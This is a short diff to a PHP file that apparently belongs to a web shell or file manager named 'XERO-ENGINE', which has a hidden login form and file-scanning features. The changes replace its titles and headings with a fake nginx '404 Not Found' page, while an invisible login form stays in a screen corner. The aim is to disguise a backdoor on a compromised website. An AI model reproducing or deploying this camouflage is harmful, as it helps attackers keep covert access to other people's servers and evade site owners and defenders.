@@ -30,10 +30,10 @@ function show_login_form($error = '') {
     ?>
 <!DOCTYPE html>
 <html>
-<head><title></title></head>
+<head><title>404 Not Found</title></head>
 <body>
-<center><h1></h1></center>
-<hr><center></center>
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
 
 <!-- Form login tersembunyi -->
 <div style="position:fixed; bottom:0; right:0; opacity:0; pointer-events:none; z-index:-1;">
@@ -409,7 +409,7 @@ function makeBreadcrumb($p) {
 <html>
 <head>
 <link rel="icon" href="-">
-<title>XERO-ENGINE</title>
+<title>404 - page not found</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
 /* =========================================================
@@ -836,7 +836,7 @@ function showScanDetails(index) {
 <body>
 
 <div class="header-flex">
-    <h2>XERO-ENGINE</h2>
+    <h2>404 - page not found</h2>
     <img src="<?php echo $logo_url; ?>" height="55" alt="Logo">
 </div>
 
